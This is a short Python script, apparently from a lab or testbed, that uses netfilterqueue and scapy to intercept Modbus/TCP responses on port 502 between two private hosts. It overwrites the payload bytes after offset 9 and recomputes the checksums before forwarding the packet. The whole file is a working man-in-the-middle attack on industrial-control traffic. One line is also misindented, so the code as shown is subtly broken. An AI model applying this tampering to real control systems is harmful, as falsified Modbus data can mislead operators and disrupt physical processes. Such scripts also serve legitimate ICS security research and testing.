import netfilterqueue
from scapy.all import *
import struct

print("start")
def processPacket(packet):

    pkt = IP(packet.get_payload())
    print (pkt.show())
    
    if (pkt.haslayer(TCP) and pkt[TCP].flags=='PA' and pkt.getlayer(IP).src == '172.16.100.200' and pkt.getlayer(IP).dst == '172.16.100.100' and pkt.getlayer(TCP).sport == 502):
       # print('+')
       # print (pkt[Raw].load)
       # pkt[Raw].load = pkt[Raw].load[:9] + b'\x0a\xb2\x0a\x01\x10\x85'
       # print (pkt[Raw].load)
       # print('-')
       # del pkt[IP].len
        pkt[Raw].load = pkt[Raw].load[:9] + b'\x00'
        del pkt[IP].chksum
        del pkt[TCP].chksum
        pkt[Raw].load = pkt[Raw].load[:9] + b'\x00'
        packet.set_payload(bytes(pkt))
       print ("test")
       # print (pkt.show())
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, processPacket)
try:
    queue.run()
except KeyboardInterrupt:
    print("end")
queue.unbind()
